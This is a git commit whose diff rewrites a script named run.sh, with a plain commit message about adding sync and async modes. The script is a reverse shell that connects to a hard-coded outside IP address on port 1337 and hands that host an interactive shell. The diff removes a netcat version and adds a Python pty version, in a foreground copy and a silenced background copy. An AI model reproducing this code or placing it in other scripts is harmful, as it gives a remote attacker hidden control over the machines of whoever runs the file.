b4ac4fb5baf9013e97a233c8102a6f34445ab256
Faris Haidar Zuhdi <faris.zuhdi@traveloka.com>
2025-11-03 11:22:46 +0700

    add sync & async mode

--- run.sh
+++ run.sh
@@ -1,11 +1,69 @@
-#!/bin/bash
-echo Running!
-(
+#!/bin/sh
+
+IP="103.150.196.198"
+PORT=1337
+SYNC=true
+
+if [ "$SYNC" = true ]; then
+  echo Running sync!
+  python3 -c "import socket,subprocess,os,pty,signal,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));
+master,slave=pty.openpty();
+p=subprocess.Popen(['/bin/sh','-i'],stdin=slave,stdout=slave,stderr=slave,preexec_fn=os.setsid);
+os.close(slave);
+import select;
+try:
+    while True:
+        r,_,_=select.select([s,master],[],[]);
+        if s in r:
+            d=s.recv(4096);
+            if len(d)==0:
+                os.killpg(os.getpgid(p.pid),signal.SIGKILL);
+                sys.exit(0);
+            os.write(master,d);
+        if master in r:
+            d=os.read(master,4096);
+            if len(d)==0:
+                break;
+            s.send(d);
+except:
+    pass;
+finally:
+    try:
+        os.killpg(os.getpgid(p.pid),signal.SIGKILL);
+    except:
+        pass;
+    sys.exit(0)"
+  exit 0
+else
+  echo Running async!
   (
-    mkfifo /tmp/f
-    #!/bin/bash
-    nc 103.150.196.198 1337 < /tmp/f | sh > /tmp/f 2>&1
-    rm /tmp/f
-  ) </dev/null >/dev/null 2>&1 &
-) &
-exit 0
+    python3 -c "import socket,subprocess,os,pty,signal,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));
+master,slave=pty.openpty();
+p=subprocess.Popen(['/bin/sh','-i'],stdin=slave,stdout=slave,stderr=slave,preexec_fn=os.setsid);
+os.close(slave);
+import select;
+try:
+    while True:
+        r,_,_=select.select([s,master],[],[]);
+        if s in r:
+            d=s.recv(4096);
+            if len(d)==0:
+                os.killpg(os.getpgid(p.pid),signal.SIGKILL);
+                sys.exit(0);
+            os.write(master,d);
+        if master in r:
+            d=os.read(master,4096);
+            if len(d)==0:
+                break;
+            s.send(d);
+except:
+    pass;
+finally:
+    try:
+        os.killpg(os.getpgid(p.pid),signal.SIGKILL);
+    except:
+        pass;
+    sys.exit(0)" &
+  ) >/dev/null 2>&1
+  exit 0
+fi
